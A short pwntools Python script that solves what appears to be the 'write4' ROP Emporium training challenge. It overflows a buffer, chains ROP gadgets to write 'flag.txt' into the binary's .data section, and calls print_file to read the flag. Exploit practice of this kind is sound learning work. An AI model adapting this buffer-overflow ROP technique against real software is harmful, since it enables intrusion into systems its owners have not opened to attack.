#!/usr/bin/python3

from pwn import *

PROG_NAME = "./write4"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

data_addr = 0x0000000000601028
mov_ptr_r14_r15_addr = 0x0000000000400628 # mov qword ptr [r14], r15; ret;
pop_r14_r15_addr = 0x0000000000400690	  # pop r14; pop r15; ret;
pop_rdi_addr = 0x0000000000400693 		  # pop rdi; ret;

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)

for i, string in enumerate([b'flag.txt', b'\x00'*8]):
	# build our string, 8 bytes at a time
	payload += p64(pop_r14_r15_addr)
	payload += p64(data_addr + i*8)
	payload += string
	payload += p64(mov_ptr_r14_r15_addr)

# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)

p.interactive()